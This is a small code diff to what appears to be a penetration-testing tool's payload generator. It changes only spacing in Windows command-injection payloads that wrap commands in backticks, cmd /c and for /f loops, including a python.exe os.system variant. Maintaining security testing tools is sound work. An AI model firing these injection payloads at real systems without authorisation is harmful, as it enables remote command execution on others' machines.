@@ -30,7 +30,7 @@ def decision(separator, TAG, randv1, randv2):
       payload = ("print(`echo " + TAG + "`." +
                   "`for /f \"delims=\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i <nul`." +
+                  "\"') do @set /p =%i < nul`." +
                   "`echo " + TAG + "`." +
                   "`echo " + TAG + "`)" +
                   separator
@@ -39,7 +39,7 @@ def decision(separator, TAG, randv1, randv2):
       payload = ("print(`echo " + TAG +
                   separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i <nul" + 
+                  "\"') do @set /p =%i < nul" + 
                   separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
@@ -104,7 +104,7 @@ def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
     cmd = ( "for /f \"delims=\" %i in ('cmd /c " + 
             cmd +
-            "') do @set /p =%i <nul"
+            "') do @set /p =%i < nul"
           )
     if separator == "":
       payload = ("print(`echo " + TAG + "`." + 
@@ -150,7 +150,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
     else:
       python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
                         settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + "')\"" + 
-                        "') do @set /p =%i <nul"
+                        "') do @set /p =%i < nul"
                        )
 
       if separator == "":
